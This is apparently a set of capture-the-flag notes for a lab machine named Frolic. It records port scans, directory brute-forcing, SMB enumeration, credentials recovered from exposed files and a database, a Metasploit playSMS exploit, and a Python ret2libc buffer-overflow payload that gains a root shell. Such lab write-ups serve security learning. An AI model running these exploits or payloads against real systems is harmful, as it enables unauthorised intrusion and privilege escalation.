@@ -1,0 +1,138 @@
+---NMAP---
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
+|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
+|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+9999/tcp open  http        nginx 1.10.3 (Ubuntu)
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Welcome to nginx!
+Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1h43m51s, deviation: 3h10m30s, median: 6m07s
+|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: frolic
+|   NetBIOS computer name: FROLIC\x00
+|   Domain name: \x00
+|   FQDN: frolic
+|_  System time: 2020-09-04T20:24:00+05:30
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-09-04T14:54:02
+|_  start_date: N/A
+
+---MASSCAN---
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 1880/tcp on 10.10.10.111
+Discovered open port 22/tcp on 10.10.10.111
+Discovered open port 139/tcp on 10.10.10.111
+Discovered open port 9999/tcp on 10.10.10.111
+Discovered open port 445/tcp on 10.10.10.111
+
+
+---GOBUSTER---
+:9999 (lowercase-medium.txt):
+  http://10.10.10.111:9999/admin
+  http://10.10.10.111:9999/test
+  http://10.10.10.111:9999/test/index.php
+  http://10.10.10.111:9999/dev
+  http://10.10.10.111:9999/admin
+  http://10.10.10.111:9999/test
+  http://10.10.10.111:9999/test/index.php
+  http://10.10.10.111:9999/dev
+  http://10.10.10.111:9999/admin/css
+  http://10.10.10.111:9999/admin/js
+  http://10.10.10.111:9999/dev/test
+  http://10.10.10.111:9999/backup
+  http://10.10.10.111:9999/backup/index.php
+  http://10.10.10.111:9999/backup/user.txt
+  http://10.10.10.111:9999/backup/password.txt
+  http://10.10.10.111:9999/dev/backup
+  http://10.10.10.111:9999/admin/css
+  http://10.10.10.111:9999/admin/js
+  http://10.10.10.111:9999/dev/test
+  http://10.10.10.111:9999/backup
+  http://10.10.10.111:9999/backup/index.php
+  http://10.10.10.111:9999/backup/user.txt
+  http://10.10.10.111:9999/backup/password.txt
+  http://10.10.10.111:9999/dev/backup
+  http://10.10.10.111:9999/dev/backup/index.php
+  http://10.10.10.111:9999/loop
+  http://10.10.10.111:9999/backup/loop
+  http://10.10.10.111:9999/loop/loop
+  http://10.10.10.111:9999/backup/loop/loop
+  
+
+---ATTEMPTS---
+*smbclient -N -L \\\\10.10.10.111\\
+  Sharename       Type      Comment
+  ---------       ----      -------
+  print$          Disk      Printer Drivers
+  IPC$            IPC       IPC Service (frolic server (Samba, Ubuntu))
+on 10.10.10.111/admin:
+  if ( username == "admin" && password == "superduperlooperpassword_lol"){
+on 10.10.10.111/backups/[user|password].txt:
+  admin/imnothuman
+no success login into ssh but success on smb
+
+found /playsms on /dev/backup/index.php
+using the unauthenticated msfconsole exploit
+done!
+*cat /home/ayush/user.txt
+
+---PRIVESC---
+./linpeas.sh:
+  [RED_YELLOW]:/var/www/html/playsms/plugin/themes/ubuntu/config.php
+
+int /var/www/html/playsms-1.4.2/install.conf
+  # MySQL database username
+  DBUSER="root"
+  # MySQL database password
+  DBPASS="ayush"
+
+found admin/1c46ee7fa38f25b47768ecd02f4a90a3 in database playsms table playsms_tblUser
+hash killer:
+  admin/idkwhatispass
+
+found in /var/www/html/playsms-1.4.2/install.conf.dist
+  # MySQL database username
+  DBUSER="root"
+  # MySQL database password
+  DBPASS="password"
+
+in /home/ayush/.binaries/rop
+*ldd rop
+  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
+*readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system:
+  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+*readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit:
+  141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+*strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh:
+  15ba0b /bin/sh
+
+simple program that prints a message, so it requires a bufferoverflow
+in python:
+  import struct
+  buf = "A" * 52 
+  libc = 0xb7e19000  
+  system = struct.pack ('<I', libc + 0x0003ada0)
+  exit = struct.pack ('<I', libc + 0x0002e9d0)
+  sh = struct.pack ('<I', libc + 0x15ba0b)
+  payload = buf + system + exit + sh
+  print payload
+./rop $(python /tmp/bff.py)
+kudos!!
+*cat /root/root.txt
